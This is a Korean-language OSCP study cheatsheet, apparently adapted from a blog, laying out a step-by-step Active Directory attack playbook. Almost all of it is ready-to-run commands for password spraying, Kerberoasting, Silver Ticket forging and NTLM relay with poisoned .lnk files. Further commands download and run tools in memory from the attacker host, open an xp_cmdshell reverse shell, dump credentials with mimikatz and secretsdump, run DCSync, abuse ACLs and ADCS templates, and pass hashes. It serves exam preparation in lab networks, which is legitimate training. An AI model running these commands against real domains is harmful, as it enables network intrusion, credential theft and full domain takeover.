---
title: "Active Directory 플레이북 (AD Playbook)"
date: 2026-06-20
weight: 100
draft: false
tags: ["oscp", "cheatsheet"]
summary: "OSCP AD 세트용 단일 선형 공격 흐름. 단계 순서대로 진행하고 작업마다 한 가지 방법만 쓴다."
---

OSCP AD 세트용 단일 선형 공격 흐름. 단계(PHASE) 순서대로 진행하고, 작업마다 한 가지 방법만 쓴다.

- 출처: https://heretek.dev/oscp-cheatsheet/active-directory-playbook/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$KALI` = 공격자(Kali) IP
- 코드의 `DC_IP`, `DOMAIN`, `USER`, `PASS`, `KALI_IP`, `FQDN` 등은 발견한 값으로 치환

## 멘토 조언 — 패스워드에 ! 이 있으면 반드시 이스케이프

```bash
# 패스워드에 " ! " 가 들어가면 반드시 \! 로 이스케이프한다.
# ' ' 로 감싸도 명령 실행에서 문제가 생기고 ! 를 제대로 읽지 못한다.

nxc smb 10.10.10.10 -u offsec -p "Password1\!"
# nxc smb 10.10.10.10 -u offsec -p 'Password1!' 는 제대로 동작하지 않는다.
```

## 막혔을 때 긴급 대응

- creds 있음, 쉘 없음 → 전 머신에 SMB + WinRM + RDP 스프레이
- 쉘 있음, 경로 없음 → 모든 SMB 공유 읽기, 트랜스크립트 grep, creds 덤프, 새 유저 신분으로 재열거
- 30분 이상 막힘 → creds 표 갱신. 다른 박스로 이동. 나중에 복귀.
- 내부망 도달 불가 → 장악한 호스트에서 Ligolo-NG 피벗
- 해시 크랙 불가 → PtH 바로 시도. 또는 shadow creds / ForceChangePassword
- Kerberos 실패 → 먼저 `sudo ntpdate DC_IP`. hostname 대신 IP 사용.

## 시험 당일 흐름

1. 셋업 — /etc/hosts, ntpdate, 터미널 로깅
2. 스캔 — 전 머신 nmap, 네트워크 맵 작성
3. Kali에서 열거 — ldapsearch, nxc smb/ldap, 공유 목록
4. 쉘 획득 — 스프레이로 얻은 creds → evil-winrm / psexec
5. 박스에서 열거 — PowerView, 파일, 트랜스크립트, 히스토리
6. creds 덤프 — secretsdump, mimikatz, LSASS
7. 새 creds 스프레이 — 모든 cred를 모든 머신에
8. 경로 찾기 — ACL 악용 / ADCS / delegation
9. DA — DCSync 또는 DC로 PtH

30분마다: creds 표 갱신. 새로 스프레이할 게 있는가? 아직 안 만진 머신은?

## CREDS 표 (전부 기록)

새 creds 발견 시 즉시 스프레이:

```bash
echo -e 'user1\nuser2' > users.txt
echo -e 'Pass1\nPass2' > passes.txt
nxc smb IP1 IP2 IP3 -u users.txt -p passes.txt --continue-on-success | grep -v FAILURE
nxc winrm IP1 IP2 IP3 -u users.txt -p passes.txt --continue-on-success | grep -v FAILURE
nxc rdp IP1 IP2 IP3 -u users.txt -p passes.txt --continue-on-success | grep -v FAILURE
# 해시 사용 시:
nxc smb IPs -u USER -H 'HASH' --continue-on-success
```

## 상황별 워드리스트 생성

```bash
# 패턴: 계절 + 연도
# 패스워드 로테이션·시즌 패스워드·회사 정책·최근 연도 힌트가 있을 때 유용
for year in {2022..2026}; do
  for season in Spring Summer Fall Winter; do
    echo "${season}${year}"
  done
done > seasons_years.txt
```

기호 포함 버전:

```bash
for year in {2022..2026}; do
  for season in Spring Summer Fall Winter; do
    for symbol in '' '!' '@' '#'; do
      echo "${season}${year}${symbol}"
    done
  done
done > seasons_years_symbols.txt
```

## PHASE 0 — 셋업 (첫 5분)

```bash
# IP 목록으로 /etc/hosts 생성
echo -e 'DC_IP\nMS01_IP\nMS02_IP' > ips.txt
nxc smb ips.txt --generate-hosts-file /tmp/hosts
sudo tee -a /etc/hosts < /tmp/hosts

# DC를 /etc/resolv.conf 에 확실히 등록
nameserver 10.10.10.10      # /etc/resolv.conf 에 DC IP 추가

# 시간 동기화 (Kerberos에 필수)
sudo ntpdate -u DC_IP

# 로깅 시작
script -a exam_ad_log.txt
```

## PHASE 1 — KALI에서 열거

### 1a. 익명 LDAP

```bash
ldapsearch -x -H ldap://DC_IP -b 'DC=domain,DC=com' | head -50
```

### 1b. 첫 creds 획득 후

```bash
ldapdomaindump -u 'DOMAIN\\USER' -p 'PASS' DC_IP -o ldap-dump/
nxc smb $ip -u '' -p '' --users
# 사용자명을 파일로 저장:
nxc smb $ip -u '' -p '' --users | tee nxc_users_raw.txt | awk '$1=="SMB" && $5 !~ /^\[|\-Username\-/ {print $5}' | sort -u > users.txt      # description 에 패스워드가 있는지 확인
nxc smb DC_IP -u USER -p 'PASS' --groups
nxc smb DC_IP -u USER -p 'PASS' --shares
nxc smb DC_IP -u USER -p 'PASS' --pass-pol   # 스프레이 전에 확인
nxc smb DC_IP -u USER -p 'PASS' -M spider_plus

nxc ldap DC_IP -u USER -p 'PASS' -M laps
nxc ldap DC_IP -u USER -p 'PASS' -M adcs
nxc ldap DC_IP -u USER -p 'PASS' --trusted-for-delegation
# AD에서 /etc/hosts 자동 생성
nxc smb ips.txt -u USER -p 'PASS' -d DOMAIN --generate-hosts-file /tmp/hosts
```

### BloodHound — 첫 creds 직후 가장 먼저 실행

Kali에서:

```bash
bloodhound-python -u 'USER' -p 'PASS' -ns DC_IP -d DOMAIN -c All
# 출력: users, groups, computers, domains, gpos, ous JSON 6개 파일이 현재 디렉터리에

# ADCS 데이터 — bloodhound-python -c All 에는 포함되지 않는다. 별도 실행:
certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
# 출력: zip 파일 1개

# BloodHound CE 업로드: JSON 6개 + zip 1개를 File Ingest 탭으로 끌어다 놓기
# 이후 유저를 Owned 로 표시 -> Shortest Paths from Owned Principals (ACL + ADCS 엣지 표시)
```

Windows에서 (SharpHound — Kali가 DC에 닿지 못할 때):

```powershell
certutil -urlcache -f http://KALI/SharpHound.exe C:\Windows\Temp\SharpHound.exe
C:\Windows\Temp\SharpHound.exe --CollectionMethods All --OutputDirectory C:\Windows\Temp\

# 또는 인메모리 (디스크 아티팩트 없음):
IEX(New-Object Net.WebClient).DownloadString('http://KALI/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Windows\Temp\

# 결과 되가져오기: evil-winrm download, 또는 base64 인코딩
```

BloodHound 쿼리 (이 순서로 실행):

1. 내 유저를 Owned 로 표시
2. Shortest Paths from Owned Principals — 내 공격 경로 (중요)
3. Shortest Paths to Domain Admins
4. Find All Kerberoastable Users
5. Find AS-REP Roastable Users
6. Find Workstations where Domain Users can RDP
7. Find Computers where Domain Users are Local Admin
8. Find Principals with DCSync Rights

커스텀 Cypher (Raw Query에 붙여넣기):

```text
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
MATCH (u:User) WHERE u.hasspn=true RETURN u
MATCH p=()-[:DCSync|GetChanges|GetChangesAll]->(:Domain) RETURN p
MATCH (m:Computer) RETURN m
```

BloodHound 엣지 치트시트:

- MemberOf: 유저가 이 그룹 소속 → 그룹 권한 상속
- AdminTo: 이 박스의 로컬 admin → psexec/wmiexec/evil-winrm
- HasSession: 이 박스에 로그인한 유저 → 박스 장악 후 그 유저의 creds 덤프
- CanRDP: 이 박스에 RDP 가능 → RDP 후 캐시된 creds 탐색
- GenericAll: 전면 제어 → 패스워드 리셋, 그룹 추가, SPN 설정, shadow creds
- GenericWrite: 속성 수정 가능 → SPN 설정 후 Kerberoast, 또는 shadow creds
- WriteOwner: 소유자 변경 가능 → 소유권 획득 -> GenericAll -> 악용
- WriteDacl: 권한 수정 가능 → 자신에게 GenericAll 부여 -> 악용
- ForceChangePassword: 패스워드 리셋 가능 → 리셋 후 그 유저로 로그인
- AddMember: 그룹에 추가 가능 → 자신을 추가
- DCSync: 전체 해시 덤프 가능 → secretsdump → 끝 (중요)

### 1c. SMB 공유 — 목록 먼저, 다운로드 나중

```bash
# 다운로드 없이 재귀 목록만
smbclient //IP/SHARE -U 'DOMAIN/USER%PASS' -c 'recurse ON; ls'

# 우선순위 파일: PowerShell_transcript.*.txt, *.ps1, *.kdbx, *.config, *.xml, *.log

# 대상 다운로드
smbclient //IP/SHARE -U 'DOM/USER%PASS' -c 'recurse ON; prompt OFF; mask *.ps1; mget *; mask *.txt; mget *; mask *.config; mget *'

# 전부 grep
grep -riE 'password|credential|secret|ConvertTo-SecureString|PSCredential' .

# 다운로드 없이 내용 검색
smbmap -H IP -u USER -p 'PASS' -d DOMAIN -R SHARE -A 'password|secure|credential|transcript|PSCredential'
```

### 1d. SYSVOL (GPP cpassword)

```bash
smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER%PASS' -c 'recurse;prompt;mget *'
grep -ri cpassword .
gpp-decrypt 'CPASSWORD_VALUE'

# 또는:
nxc smb DC_IP -u USER -p 'PASS' -M gpp_password
```

### 1e. ADCS + Delegation

```bash
certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
impacket-findDelegation 'DOMAIN/USER:PASS' -dc-ip DC_IP
```

## PHASE 2 — 크리덴셜 공격

### AS-REP Roasting

```bash
# creds 없이 (유저명 목록 필요)
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt

# creds 있을 때
impacket-GetNPUsers 'DOMAIN/USER:PASS' -dc-ip DC_IP -request -outputfile asrep.txt

# 크랙
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Kerberoasting

```bash
impacket-GetUserSPNs 'DOMAIN/USER:PASS' -dc-ip DC_IP -request -outputfile kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

### Silver Ticket — 절차와 변형

- 시도 조건: Kerberoast 크랙 성공 + 서비스 계정 패스워드/해시 보유 + 일반 로그인 실패 또는 유의미한 접근 없음
- 기본 규칙: Kerberos 신원에는 FQDN 사용. IP나 터널은 `-target-ip` 에만 사용

필요 정보:

- 도메인명
- 도메인 SID
- 서비스 계정 패스워드 또는 NTLM 해시
- 대상 FQDN
- 대상 IP / 터널 엔드포인트
- SPN
- 사칭할 유저
- (선택) 그룹 RID

#### 도메인 SID 구하기

`whoami /all` 또는 `whoami /user` 출력에서 마지막 RID를 제거하면 SID가 나온다.

Kali에서:

```bash
lookupsid.py DOMAIN/USER:'PASS'@DC_IP
```

#### 패스워드 → NTLM

```bash
pypykatz crypto nt 'PASSWORD'
```

예시:

```bash
pypykatz crypto nt 'Summer2024!'
```

#### MSSQL Silver Ticket — 기본

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn MSSQLSvc/FQDN:1433 -user-id 500 Administrator
```

티켓 로드:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache && klist
```

#### MSSQL 연결 — 직행

```bash
proxychains impacket-mssqlclient -k -no-pass DOMAIN/Administrator@FQDN -target-ip TARGET_IP -port 1433
```

#### MSSQL 연결 — 로컬 터널

서비스가 로컬로 포워드된 경우 사용:

```text
Kali 127.0.0.1:1433 -> 내부 대상:1433
```

명령:

```bash
proxychains impacket-mssqlclient -k -no-pass DOMAIN/Administrator@FQDN -target-ip 127.0.0.1 -port 1433
```

#### MSSQL 검증

```text
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

sysadmin이면:

```text
enable_xp_cmdshell EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'hostname';
```

리버스 쉘:

```text
EXEC xp_cmdshell 'powershell -exec bypass -enc BASE64_PAYLOAD';
```

문법 주의: `xp_cmdshell 'whoami'` 는 안 되고 `EXEC xp_cmdshell 'whoami';` 처럼 EXEC와 세미콜론이 필요하다.

#### MSSQL Silver Ticket — 커스텀 그룹 RID

기본 티켓이 guest/무권한으로 연결되거나 수상한 그룹이 존재할 때 사용. 수상한 그룹 예시: Administrators, SQL Admins, MSSQL Admins, IT Database Admins, Server Operators, Account Operators.

그룹 RID를 넣어 포지:

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn MSSQLSvc/FQDN:1433 -user-id 500 -groups RID Administrator
```

다시 로드:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache && klist
```

#### CIFS Silver Ticket 변형

SPN/서비스가 SMB/CIFS인 경우 사용. 포지:

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn cifs/FQDN -user-id 500 Administrator
```

로드:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache && klist
```

사용:

```bash
proxychains smbclient -k //FQDN/C$
```

또는:

```bash
proxychains impacket-psexec -k -no-pass DOMAIN/Administrator@FQDN -target-ip TARGET_IP
```

로컬 터널 사용 시에도 Kerberos 신원은 FQDN 유지, IP/터널은 도구가 지원하는 옵션에 넣는다.

#### HOST / WSMAN 변형

서비스 경로가 HOST 또는 WinRM/WSMAN을 요구할 때만 사용. HOST 포지:

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn HOST/FQDN -user-id 500 Administrator
```

WSMAN 포지:

```bash
impacket-ticketer -nthash HASH -domain-sid DOMAIN_SID -domain DOMAIN -spn WSMAN/FQDN -user-id 500 Administrator
```

로드:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache && klist
```

#### 공통 수정 사항

- SPN은 `MSSQLSvc/FQDN:1433` 사용 (`MSSQL/FQDN` 아님)
- Kerberos 신원은 `DOMAIN/User@FQDN` 형식
- IP 또는 127.0.0.1은 `-target-ip` 에만 사용
- mssqlclient가 DOMAIN:88 로 시도한다면 티켓 SPN이 일치하지 않는 신호
- 직접 IP는 실패하고 터널은 동작하면 `-target-ip 127.0.0.1` 사용
- 연결됐지만 guest/무권한이면 `-groups RID` 로 재시도
- Kerberos 실패 → `ntpdate DC_IP` 실행, /etc/hosts 확인
- klist SPN이 틀리면 ccache 삭제 후 재포지

#### 판단 흐름

```text
Kerberoast로 서비스 계정 크랙
  ↓ 일반 로그인 실패 또는 쉘 없음
  ↓ 패스워드 → NTLM 변환
  ↓ 도메인 SID 확보
  ↓ 정확한 SPN으로 Silver Ticket 포지
  ↓ ccache 로드
  ↓ FQDN 신원으로 연결
  ↓ 도달 가능한 IP/터널을 -target-ip 에
  ↓ 권한 확인
  ↓ guest/무권한이면 커스텀 그룹 RID로 재시도
```

#### 핵심 규칙

서비스 계정을 크랙했는데 일반 로그인이 실패해도 버리지 않는다. 패스워드/해시를 Kerberos 서비스 키로 취급하고 정확한 SPN으로 Silver Ticket을 포지한다. (중요)

### Password Spraying

```bash
# 스프레이 전에 lockout 정책 확인
nxc smb DC_IP -u USER -p 'PASS' --pass-pol

# 스프레이
kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt 'CompanyName2024!'
nxc smb DC_IP -u users.txt -p 'Password1' --continue-on-success --no-bruteforce
```

### Responder (LLMNR/NBT-NS)

```bash
sudo responder -I tun0 -v
# MSSQL로 강제 인증: EXEC xp_dirtree '\\\\KALI\\share'
# 크랙: hashcat -m 5600 (PtH 불가, 크랙 필수)
```

### NTLM Relay

- 허용: ntlmrelayx + Responder를 리스너로 + 파일 기반 coercion
- 제한: LLMNR/NBT-NS/mDNS 포이즈닝(Responder 기본 모드)
- Responder는 Responder.conf 에서 포이즈닝을 비활성화한 상태로만 사용

```bash
# 1. 유저가 탐색하는 쓰기 가능한 공유 찾기
smbclient //TARGET/SHARE -U 'DOMAIN\USER'

# 2. ntlm_theft 로 오염된 .lnk 생성
git clone https://github.com/Greenwolf/ntlm_theft
python3 ntlm_theft.py -g lnk -s KALI_IP -f loot
smbclient //TARGET/SHARE -U 'DOMAIN\USER' -c 'put loot.lnk'

# 3. 릴레이 대상 찾기 (SMB signing 비활성)
nxc smb SUBNET/24 --gen-relay-list relay_targets.txt

# 4. 릴레이 리스너 시작 (재사용용 socks 프록시)
sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks

# 5. 피해자가 탐색기에서 그 폴더를 열기를 대기
# ntlmrelayx 콘솔에서 'socks' 입력 시 활성 세션 확인

# 6. proxychains 로 릴레이 세션 사용
# /etc/proxychains.conf 마지막 줄: socks4 127.0.0.1 1080
proxychains -q impacket-secretsdump DOMAIN/USER@TARGET -no-pass
proxychains -q nxc smb TARGET -u USER -p '' --sam
```

다른 coercion 방법 (전부 허용 — 포이즈닝 없음):

```bash
# MSSQL (connect 권한만 있으면 누구나, non-sysadmin 포함):
EXEC master..xp_dirtree '\\KALI_IP\x'
EXEC master..xp_fileexist '\\KALI_IP\x'

# 쓰기 가능한 공유에 드롭:
#   \\KALI_IP\x 를 가리키는 .lnk, .url, .scf, desktop.ini
```

## PHASE 3 — 쉘 획득

```bash
# WinRM (5985) - 가장 깔끔
evil-winrm -i IP -u USER -p 'PASS'
evil-winrm -i IP -u USER -H 'NT_HASH'

# PsExec (445, SYSTEM 쉘, 시끄러움)
impacket-psexec 'DOMAIN/USER:PASS'@IP
impacket-psexec 'DOMAIN/USER'@IP -hashes :NTHASH

# WmiExec (135, 더 은밀)
impacket-wmiexec 'DOMAIN/USER:PASS'@IP
impacket-wmiexec 'DOMAIN/USER'@IP -hashes :NTHASH

# DCOM (MMC20.Application — WmiExec/PsExec 막혔을 때 장악한 Windows 박스에서)
# TARGET 에 로컬 admin 필요. 현재 세션에서 실행, 서비스 생성 없음.
\$com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','TARGET'))
\$com.Document.ActiveView.ExecuteShellCommand('cmd.exe',\$null,'/c CMD_HERE','7')

# RDP
xfreerdp /u:USER /p:'PASS' /d:DOMAIN /v:IP /cert:ignore +clipboard
```

(DCOM 두 줄은 소스에 `\$` 이스케이프가 붙은 채로 실려 있다. PowerShell 콘솔에 입력할 때는 `$com`, `$null` 처럼 백슬래시를 뺀다.)

그룹 → 도구 매핑:

- Remote Management Users → evil-winrm
- Remote Desktop Users → xfreerdp
- Local Administrators → psexec / wmiexec / evil-winrm
- Domain Users 뿐이면 → SSH이 있으면 SSH, 접근 가능한 것을 확인

## PHASE 4 — 장악한 Windows 박스에서 열거

### 모든 박스 첫 명령

```text
whoami /all
hostname
ipconfig /all
netstat -ano | findstr LISTENING
net user /domain
net group "Domain Admins" /domain
net localgroup Administrators
```

### net.exe / dsquery (내장, 업로드 불필요)

```text
net user /domain
net user USERNAME /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net accounts /domain

dsquery user -name "*"
dsquery group -name "*"
dsquery computer
```

### PowerView (PowerView.ps1 업로드 먼저)

```powershell
Import-Module .\PowerView.ps1

# 도메인 정보
Get-Domain
Get-DomainPolicy
Get-DomainController

# 유저
Get-DomainUser | select samaccountname,description
Get-DomainUser -SPN                     # Kerberoastable
Get-DomainUser -PreauthNotRequired      # AS-REP Roastable

# 그룹
Get-DomainGroup | select samaccountname
Get-DomainGroupMember 'Domain Admins'
Get-DomainGroupMember 'Backup Operators'

# 컴퓨터
Get-DomainComputer | select dnshostname,operatingsystem
Get-DomainComputer | Resolve-IPAddress

# 접근 + ACL
Find-LocalAdminAccess
Find-InterestingDomainAcl -ResolveGUIDs
Get-NetSession -ComputerName TARGET

# Kerberoastable
Get-DomainUser -SPN | Select-Object SamAccountName, ServicePrincipalName
Convert-SidToName S-1-5-21-...-1104
```

### Windows 측 공격 도구 (타깃에 업로드)

```powershell
# Enumerate logged-on users on another box

# 도메인 내부에서 패스워드 스프레이
Spray-Passwords.ps1

# Rubeus - AS-REP Roasting
.\Rubeus.exe asreproast /outfile:asrep.txt

# Rubeus - Kerberoasting
.\Rubeus.exe kerberoast /outfile:tgs.txt

# Rubeus - 해시로 TGT 요청 (overpass-the-hash)
.\Rubeus.exe asktgt /user:USER /rc4:NTHASH /domain:DOMAIN /outfile:ticket.kirbi
.\Rubeus.exe ptt /ticket:ticket.kirbi

# Mimikatz - 캐시된 크리덴셜 덤프
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Mimikatz - 로컬 SAM 덤프 (lsadump::sam 전에 token::elevate)
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

# Mimikatz - LSA secrets 덤프 (중요 - 평문 서비스 계정 패스워드가 들어있는 경우가 많다)
# 확인할 것: _SC_servicename 항목 (평문 서비스 패스워드)
#           MACHINE.ACC (이 머신의 컴퓨터 계정 해시)
#           DPAPI 시스템 키, 자동 로그인 creds, 저장된 RDP 패스워드
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::secrets" "exit"

# Mimikatz - 장악한 박스에서 DCSync
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:DOMAIN\\Administrator" "exit"

# Mimikatz - pass-the-hash (대상 유저로 새 프로세스 생성)
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NTHASH /run:powershell" "exit"

# Mimikatz - 메모리에서 티켓 export
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"

# PowerView - 발견한 엣지에 대한 표적 공격
Set-DomainUserPassword -Identity TARGET -AccountPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)
Set-DomainObject -Identity TARGET -SET @{serviceprincipalname='fake/spn'}
Add-DomainGroupMember -Identity 'GROUP' -Members USER
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=com' -PrincipalIdentity USER -Rights DCSync

# PowerView - 파이프라인으로 Kerberoast
Get-DomainUser -SPN | ? {$_.samaccountname -ne "krbtgt"} | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII kerberoast.hashes
```

### 파일 + 크리덴셜 헌팅

```powershell
# PowerShell 히스토리
Get-ChildItem -Path C:\Users -Recurse -Filter ConsoleHost_history.txt -EA SilentlyContinue | Get-Content

# 저장된 creds
cmdkey /list
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# 설정 파일 + KeePass
Get-ChildItem -Path C:\Users -Recurse -Include *.txt,*.xml,*.ini,*.config -EA SilentlyContinue | Select-String "pass" -List | Select Path
Get-ChildItem -Path C:\ -Recurse -Filter *.kdbx -EA SilentlyContinue | Select FullName

# 흔한 디렉터리
ls C:\Users\Public
ls C:\Temp
ls C:\Windows\Temp
ls C:\inetpub
```

## PHASE 5 — 크리덴셜 덤프 (admin 이후)

```bash
# Kali에서 - SAM + LSA + DCC2
impacket-secretsdump 'DOMAIN/USER:PASS'@IP
impacket-secretsdump 'DOMAIN/USER'@IP -hashes :NTHASH

# DCSync (DC 전용, 권한 필요)
impacket-secretsdump 'DOMAIN/Administrator:PASS'@DC_IP -just-dc

# nxc 단축
nxc smb IP -u USER -p 'PASS' --sam      # 로컬 해시
nxc smb IP -u USER -p 'PASS' --lsa      # LSA secrets
nxc smb DC_IP -u USER -p 'PASS' --ntds  # 도메인 전체 해시 (DC 전용)
```

```powershell
# Windows에서 - Mimikatz
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
mimikatz.exe "privilege::debug" "lsadump::dcsync /user:DOMAIN\Administrator" "exit"
```

출력을 전부 읽는다: SAM 해시, DCC2(느림), LSA secrets, SC 항목(평문 서비스 패스워드).

## PHASE 6 — ACL 악용

판단 표:

- WriteOwner: USER 대상 → 소유권 획득 -> GenericAll -> shadow creds / GROUP 대상 → 소유권 획득 -> GenericAll -> 자신 추가
- GenericAll: USER 대상 → shadow creds / 패스워드 리셋 / SPN 설정 / GROUP 대상 → 자신을 멤버로 추가
- GenericWrite: USER 대상 → shadow creds / 표적 Kerberoast / UPN 스왑 / GROUP 대상 → 속성 수정
- WriteDacl: USER 대상 → 자신에게 GenericAll 부여 후 진행 / GROUP 대상 → 자신에게 GenericAll 부여, 자신 추가
- ForceChangePassword: USER 대상 → 패스워드 직접 리셋 / GROUP 대상 → 해당 없음
- AddMember: USER 대상 → 해당 없음 / GROUP 대상 → 자신을 직접 추가

### WriteOwner -> USER

```bash
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' set owner TARGET USER
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' add genericAll TARGET USER
certipy-ad shadow auto -u USER@DOMAIN -p 'PASS' -account TARGET -dc-ip DC_IP
```

### WriteOwner -> GROUP

```bash
# 같은 2단계: 소유권 획득, 자신에게 권한 부여, 그다음 그룹에 자신 추가
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' set owner GROUPNAME USER
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' add genericAll GROUPNAME USER
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' add groupMember 'GROUPNAME' USER
# BloodHound 재확인 — GROUPNAME 이 주는 권한은? (보통 AdminTo / DCSync 권한)
```

### GenericAll / GenericWrite -> USER

리셋 검증 필수: `nxc smb DC_IP -u TARGET -p NEW_PASS`

```bash
# 1. [OK] net rpc password (BloodHound abuse 패널 기준)
#    모든 플레이스홀더 치환 필수 — DomainController, TargetUser 등은 템플릿
net rpc password "TARGET" "NewP@ss123!" -U "DOMAIN"/"USER"%"PASS" -S "DC_IP"

# 2. [OK] rpcclient 대체
rpcclient -U 'DOMAIN/USER%PASS' DC_IP -c 'setuserinfo2 TARGET 23 NewP@ss123!'

# 3. [WARN] bloodyAD — 성공 보고 후 실제 반영이 안 될 수 있다
#    1, 2 가 실패할 때만. 반드시 인증으로 검증.
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' set password TARGET 'NewP@ss123!'

# 4. [ADCS 있을 때만] Shadow credentials - ADCS 존재를 먼저 확인
certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
# 'Found 0 certificate authorities' -> 건너뛰기, ADCS 미배치
certipy-ad shadow auto -u USER@DOMAIN -p 'PASS' -account TARGET -dc-ip DC_IP

# 5. [GenericWrite 또는 GenericAll] Targeted Kerberoast - 조용함 (유저 로그온 보존)
python3 targetedKerberoast.py --dc-ip DC_IP -v -d DOMAIN -u USER -p 'PASS'
# 수동 PowerView 대체 (장악한 Windows 박스에서, impacket 실패 시):
# Set-DomainObject -Identity TARGET -Set @{serviceprincipalname='nonexistent/spn'}
# Get-DomainUser TARGET | Get-DomainSPNTicket | fl
# Set-DomainObject -Identity TARGET -Clear serviceprincipalname
```

### WriteDacl -> DCSync

```bash
dacledit.py -action write -rights DCSync -principal USER -target-dn 'DC=domain,DC=com' DOMAIN/USER:PASS -dc-ip DC_IP
impacket-secretsdump DOMAIN/USER:PASS@DC_IP -just-dc-user Administrator
```

### ForceChangePassword

```bash
rpcclient -U 'DOMAIN/USER%PASS' DC_IP -c 'setuserinfo2 TARGET 23 NewP@ss123!'
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' set password TARGET 'NewP@ss123!'
```

### AddMember

```bash
bloodyAD -d DOMAIN --host DC_IP -u USER -p 'PASS' add groupMember 'GROUP' USER
net rpc group addmem 'GROUP' USER -U 'DOMAIN/USER%PASS' -S DC_IP
```

## PHASE 7 — ADCS (인증서 악용)

```bash
certipy-ad find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
```

### ESC1 — Enrollee supplies subject

```bash
certipy-ad req -u USER@DOMAIN -p 'PASS' -ca CA-NAME -template TEMPLATE -upn Administrator@DOMAIN -target DC_IP
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC4 -> ESC1 — 권한 있는 템플릿 수정

```bash
certipy-ad template -u USER@DOMAIN -hashes HASH -template TEMPLATE -dc-ip DC_IP -target DC_IP -write-default-configuration
certipy-ad req -u USER@DOMAIN -hashes HASH -ca CA-NAME -template TEMPLATE -upn Administrator@DOMAIN -target DC_IP
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC9 — UPN 스왑

```bash
certipy-ad account update -u USER@DOMAIN -p 'PASS' -user TARGET -upn Administrator -dc-ip DC_IP
certipy-ad req -u TARGET@DOMAIN -hashes HASH -ca CA-NAME -template TEMPLATE -dc-ip DC_IP
certipy-ad account update -u USER@DOMAIN -p 'PASS' -user TARGET -upn TARGET@DOMAIN -dc-ip DC_IP
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

certipy 전에 항상 `sudo ntpdate -u DOMAIN`. `-target` 에는 hostname 대신 IP 사용.

## PHASE 8 — PtH / PtT

### Pass-the-Hash (NTLM — 32자리 hex)

```bash
evil-winrm -i IP -u USER -H 'NTHASH'
impacket-psexec 'DOMAIN/USER'@IP -hashes :NTHASH
impacket-wmiexec 'DOMAIN/USER'@IP -hashes :NTHASH
nxc smb IP -u USER -H 'HASH'
nxc smb IP -u USER -H 'HASH' --local-auth
```

PtH는 NTLMv2(Responder)에는 안 통한다 — 그쪽은 크랙해야 한다.

### Overpass-the-Hash

```bash
impacket-getTGT -dc-ip DC_IP -hashes :NTHASH DOMAIN/USER
export KRB5CCNAME=USER.ccache
impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP DOMAIN/USER@TARGET.DOMAIN
```

### Pass-the-Ticket

```bash
export KRB5CCNAME=ticket.ccache
impacket-psexec -k -no-pass DOMAIN/USER@dc01.domain.local
```

## PHASE 9 — LAPS

```bash
nxc ldap DC_IP -u USER -p 'PASS' -M laps
# LAPS v1 (구버전, 평문 속성)
ldapsearch -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASS' -b 'DC=domain,DC=com' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd
# LAPS v2 (2023+, JSON 랩 형태일 수 있음: {"n":"Administrator","p":"plaintext"})
ldapsearch -H ldap://DC_IP -D 'USER@DOMAIN' -w 'PASS' -b 'DC=domain,DC=com' '(msLAPS-Password=*)' msLAPS-Password
```

LAPS 패스워드는 컴퓨터별로 다르고 주기적으로 리셋된다. 해당 박스의 로컬 admin 자격으로 사용.

